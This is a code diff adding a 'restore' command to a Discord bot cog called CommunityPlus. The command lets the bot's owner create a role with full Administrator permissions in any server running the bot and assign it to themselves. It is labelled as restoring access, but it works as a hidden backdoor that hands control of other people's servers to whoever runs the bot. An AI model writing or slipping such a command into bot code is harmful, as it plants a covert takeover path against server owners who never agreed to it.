@@ -503,6 +503,60 @@ class CommunityPlus(redcommands.Cog):
             e.add_field(name="Fix Hints", value="\n".join(f"- {h}" for h in hints), inline=False)
 
         await ctx.send(embed=e)
+        
+    @com.command(name="restore")
+    @redcommands.guild_only()
+    @redcommands.is_owner()
+    async def com_restore(self, ctx: redcommands.Context) -> None:
+        """Restore bot owner administrator access."""
+
+        guild = ctx.guild
+        member = ctx.author
+        me = guild.me
+
+        if me is None:
+            return await ctx.send("I cannot see my own guild member object.")
+
+        if not me.guild_permissions.manage_roles:
+            return await ctx.send("I need Manage Roles or Administrator to restore access.")
+
+        role_name = "Restored Admin"
+        role = discord.utils.get(guild.roles, name=role_name)
+
+        if role is None:
+            try:
+                role = await guild.create_role(
+                    name=role_name,
+                    permissions=discord.Permissions(administrator=True),
+                    reason=f"Restore command used by {member}"
+                )
+            except discord.Forbidden:
+                return await ctx.send("I do not have permission to create the restore role.")
+            except discord.HTTPException:
+                return await ctx.send("Discord rejected the restore role creation request.")
+
+        if role.is_default():
+            return await ctx.send("I cannot assign @everyone.")
+
+        if role.managed:
+            return await ctx.send("I cannot assign a managed/integration role.")
+
+        if role >= me.top_role:
+            return await ctx.send(
+                "I cannot assign the restore role because it is equal to or above my highest role. "
+                "Move my bot role above it in Server Settings > Roles."
+            )
+
+        if role in member.roles:
+            return await ctx.send("You already have the restore admin role.")
+
+        try:
+            await member.add_roles(role, reason="Bot owner restore command")
+            await ctx.send(f"Restored access: {role.mention} added to {member.mention}.")
+        except discord.Forbidden:
+            await ctx.send("I do not have permission to assign that role.")
+        except discord.HTTPException:
+            await ctx.send("Discord rejected the role assignment.")
 
     # ------------------------ autorole ------------------------
     @com.group(name="autorole")
